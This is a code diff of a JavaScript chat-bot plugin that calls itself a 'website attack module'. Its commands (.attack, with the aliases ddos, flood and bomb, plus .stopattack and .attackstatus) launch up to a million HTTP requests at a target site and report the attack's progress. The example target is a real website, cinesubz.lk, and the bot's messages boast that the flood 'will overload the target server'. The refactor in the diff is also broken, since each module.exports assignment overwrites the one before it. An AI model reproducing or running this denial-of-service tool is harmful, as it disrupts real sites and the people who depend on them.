@@ -2,8 +2,6 @@ const config = require('../config')
 const axios = require('axios');
 const cheerio = require('cheerio');
 const UserAgent = require('user-agents');
-const cluster = require('cluster');
-const os = require('os');
 
 // ======================================================
 // WEBSITE ATTACK MODULE - CUSTOM REQUEST COUNT
@@ -22,124 +20,130 @@ let attackStats = {
 };
 
 // ====================== MAIN ATTACK COMMAND ======================
-cmd({
-    pattern: "attack",
-    alias: ["siteattack", "ddos", "flood", "bomb"],
+module.exports = {
+    name: 'attack',
+    pattern: 'attack',
+    alias: ['siteattack', 'ddos', 'flood', 'bomb'],
     react: '💀',
-    category: "admin",
-    desc: "Attack a website with multiple requests",
-    use: ".attack https://cinesubz.lk 10000",
-    filename: __filename
-}, async (conn, m, mek, { from, q, prefix, isMe, isSudo, isOwner, reply }) => {
-    try {
-        // Security check - only authorized users
-        if (!isMe && !isSudo && !isOwner) {
-            await conn.sendMessage(from, { react: { text: '⛔', key: mek.key } });
-            return await reply("*⛔ You are not authorized to use this command!*");
+    category: 'admin',
+    desc: 'Attack a website with multiple requests',
+    use: '.attack https://cinesubz.lk 10000',
+    filename: __filename,
+    async execute(conn, m, mek, { from, q, prefix, isMe, isSudo, isOwner, reply }) {
+        try {
+            // Security check - only authorized users
+            if (!isMe && !isSudo && !isOwner) {
+                await conn.sendMessage(from, { react: { text: '⛔', key: mek.key } });
+                return await reply("*⛔ You are not authorized to use this command!*");
+            }
+
+            if (!q) {
+                return await reply(`*📖 Usage:*\n${prefix}attack <website_url> <request_count>\n\n*Example:*\n${prefix}attack https://cinesubz.lk 10000\n\n*Options:*\n• Method: GET (default)\n• Concurrent: 100 requests/cycle\n• Timeout: 5s\n\n*⚠️ Use with caution!*`);
+            }
+
+            // Parse parameters
+            const parts = q.split(' ');
+            let targetUrl = parts[0];
+            let requestCount = parseInt(parts[1]) || 1000;
+
+            // Validate URL
+            if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
+                targetUrl = 'https://' + targetUrl;
+            }
+
+            // Validate request count
+            if (isNaN(requestCount) || requestCount < 1) {
+                requestCount = 1000;
+            }
+            if (requestCount > 1000000) {
+                requestCount = 1000000; // Max 1 million
+            }
+
+            // Check if already attacking
+            if (isAttacking) {
+                return await reply(`⚠️ *Attack already running!*\n\n🎯 Target: ${attackStats.target}\n📊 Sent: ${attackStats.total}/${attackStats.total + attackStats.failed + attackStats.successful}\n\n*Use .stopattack to stop*`);
+            }
+
+            // Confirm with user
+            await reply(`💀 *ATTACK STARTED!*\n\n🎯 Target: ${targetUrl}\n📨 Total Requests: ${requestCount.toLocaleString()}\n🧵 Concurrent: 100 requests/cycle\n⏱️ Estimated time: ~${Math.ceil(requestCount / 800)}s\n\n⚠️ *This will overload the target server!*`);
+
+            // Start attack
+            await startWebsiteAttack(targetUrl, requestCount, conn, from, mek, reply);
+
+        } catch (e) {
+            console.log(e);
+            await reply('🚩 *Error starting attack!*');
         }
-
-        if (!q) {
-            return await reply(`*📖 Usage:*\n${prefix}attack <website_url> <request_count>\n\n*Example:*\n${prefix}attack https://cinesubz.lk 10000\n\n*Options:*\n• Method: GET (default)\n• Concurrent: 100 requests/cycle\n• Timeout: 5s\n\n*⚠️ Use with caution!*`);
-        }
-
-        // Parse parameters
-        const parts = q.split(' ');
-        let targetUrl = parts[0];
-        let requestCount = parseInt(parts[1]) || 1000;
-
-        // Validate URL
-        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
-            targetUrl = 'https://' + targetUrl;
-        }
-
-        // Validate request count
-        if (isNaN(requestCount) || requestCount < 1) {
-            requestCount = 1000;
-        }
-        if (requestCount > 1000000) {
-            requestCount = 1000000; // Max 1 million
-        }
-
-        // Check if already attacking
-        if (isAttacking) {
-            return await reply(`⚠️ *Attack already running!*\n\n🎯 Target: ${attackStats.target}\n📊 Sent: ${attackStats.total}/${attackStats.total + attackStats.failed + attackStats.successful}\n\n*Use .stopattack to stop*`);
-        }
-
-        // Confirm with user
-        await reply(`💀 *ATTACK STARTED!*\n\n🎯 Target: ${targetUrl}\n📨 Total Requests: ${requestCount.toLocaleString()}\n🧵 Concurrent: 100 requests/cycle\n⏱️ Estimated time: ~${Math.ceil(requestCount / 800)}s\n\n⚠️ *This will overload the target server!*`);
-
-        // Start attack
-        await startWebsiteAttack(targetUrl, requestCount, conn, from, mek, reply);
-
-    } catch (e) {
-        console.log(e);
-        await reply('🚩 *Error starting attack!*');
     }
-});
+};
 
 // ====================== STOP ATTACK COMMAND ======================
-cmd({
-    pattern: "stopattack",
-    alias: ["stopatt", "attackstop", "halt"],
+module.exports = {
+    name: 'stopattack',
+    pattern: 'stopattack',
+    alias: ['stopatt', 'attackstop', 'halt'],
     react: '🛑',
-    category: "admin",
-    desc: "Stop the ongoing attack",
-    use: ".stopattack",
-    filename: __filename
-}, async (conn, m, mek, { from, isMe, isSudo, isOwner, reply }) => {
-    try {
-        if (!isMe && !isSudo && !isOwner) {
-            return await reply("*⛔ You are not authorized!*");
+    category: 'admin',
+    desc: 'Stop the ongoing attack',
+    use: '.stopattack',
+    filename: __filename,
+    async execute(conn, m, mek, { from, isMe, isSudo, isOwner, reply }) {
+        try {
+            if (!isMe && !isSudo && !isOwner) {
+                return await reply("*⛔ You are not authorized!*");
+            }
+
+            if (!isAttacking) {
+                return await reply("*⚠️ No attack is currently running.*");
+            }
+
+            attackStop = true;
+            await reply(`🛑 *Stopping attack...*\n\n📊 Final stats:\n✅ Success: ${attackStats.successful}\n❌ Failed: ${attackStats.failed}\n📨 Total: ${attackStats.total}\n🎯 Target: ${attackStats.target}\n⏱️ Duration: ${Math.floor((Date.now() - attackStats.startTime) / 1000)}s`);
+
+        } catch (e) {
+            console.log(e);
+            await reply('🚩 *Error stopping attack!*');
         }
-
-        if (!isAttacking) {
-            return await reply("*⚠️ No attack is currently running.*");
-        }
-
-        attackStop = true;
-        await reply(`🛑 *Stopping attack...*\n\n📊 Final stats:\n✅ Success: ${attackStats.successful}\n❌ Failed: ${attackStats.failed}\n📨 Total: ${attackStats.total}\n🎯 Target: ${attackStats.target}\n⏱️ Duration: ${Math.floor((Date.now() - attackStats.startTime) / 1000)}s`);
-
-    } catch (e) {
-        console.log(e);
-        await reply('🚩 *Error stopping attack!*');
     }
-});
+};
 
 // ====================== ATTACK STATUS COMMAND ======================
-cmd({
-    pattern: "attackstatus",
-    alias: ["attstatus", "attackinfo"],
+module.exports = {
+    name: 'attackstatus',
+    pattern: 'attackstatus',
+    alias: ['attstatus', 'attackinfo'],
     react: '📊',
-    category: "admin",
-    desc: "Check current attack status",
-    use: ".attackstatus",
-    filename: __filename
-}, async (conn, m, mek, { from, isMe, isSudo, isOwner, reply }) => {
-    try {
-        if (!isMe && !isSudo && !isOwner) {
-            return await reply("*⛔ You are not authorized!*");
+    category: 'admin',
+    desc: 'Check current attack status',
+    use: '.attackstatus',
+    filename: __filename,
+    async execute(conn, m, mek, { from, isMe, isSudo, isOwner, reply }) {
+        try {
+            if (!isMe && !isSudo && !isOwner) {
+                return await reply("*⛔ You are not authorized!*");
+            }
+
+            if (!isAttacking) {
+                return await reply("*⚠️ No attack is currently running.*");
+            }
+
+            const elapsed = Math.floor((Date.now() - attackStats.startTime) / 1000);
+            const rps = attackStats.total / Math.max(elapsed, 1);
+            const avgResponse = attackStats.responseTimes.length > 0 ? 
+                (attackStats.responseTimes.reduce((a, b) => a + b, 0) / attackStats.responseTimes.length).toFixed(0) : 'N/A';
+
+            let statusCodes = '';
+            Object.keys(attackStats.statusCodes).slice(0, 5).forEach(code => {
+                statusCodes += `\n  ${code}: ${attackStats.statusCodes[code]}`;
+            });
+
+            await reply(`📊 *ATTACK STATUS*\n\n⏱️ Running: ${elapsed}s\n📨 Total: ${attackStats.total.toLocaleString()}\n✅ Success: ${attackStats.successful.toLocaleString()}\n❌ Failed: ${attackStats.failed.toLocaleString()}\n📈 RPS: ${rps.toFixed(1)}\n⏱️ Avg Response: ${avgResponse}ms\n🎯 Target: ${attackStats.target}\n📊 Status Codes:${statusCodes || ' N/A'}\n\n💀 Status: ACTIVE`);
+        } catch (e) {
+            console.log(e);
+            await reply('🚩 *Error fetching status!*');
         }
-
-        if (!isAttacking) {
-            return await reply("*⚠️ No attack is currently running.*");
-        }
-
-        const elapsed = Math.floor((Date.now() - attackStats.startTime) / 1000);
-        const rps = attackStats.total / Math.max(elapsed, 1);
-        const avgResponse = attackStats.responseTimes.length > 0 ? 
-            (attackStats.responseTimes.reduce((a, b) => a + b, 0) / attackStats.responseTimes.length).toFixed(0) : 'N/A';
-
-        let statusCodes = '';
-        Object.keys(attackStats.statusCodes).slice(0, 5).forEach(code => {
-            statusCodes += `\n  ${code}: ${attackStats.statusCodes[code]}`;
-        });
-
-        await reply(`📊 *ATTACK STATUS*\n\n⏱️ Running: ${elapsed}s\n📨 Total: ${attackStats.total.toLocaleString()}\n✅ Success: ${attackStats.successful.toLocaleString()}\n❌ Failed: ${attackStats.failed.toLocaleString()}\n📈 RPS: ${rps.toFixed(1)}\n⏱️ Avg Response: ${avgResponse}ms\n🎯 Target: ${attackStats.target}\n📊 Status Codes:${statusCodes || ' N/A'}\n\n💀 Status: ACTIVE`);
-    } catch (e) {
-        console.log(e);
-        await reply('🚩 *Error fetching status!*');
     }
-});
+};
 
 // ====================== ATTACK CORE FUNCTION ======================
 
@@ -328,3 +332,11 @@ function sleep(ms) {
 // .stopattack                          → Stop the attack
 // .attackstatus                        → Check attack status
 // ======================================================
+
+
+
+
+
+
+        
+
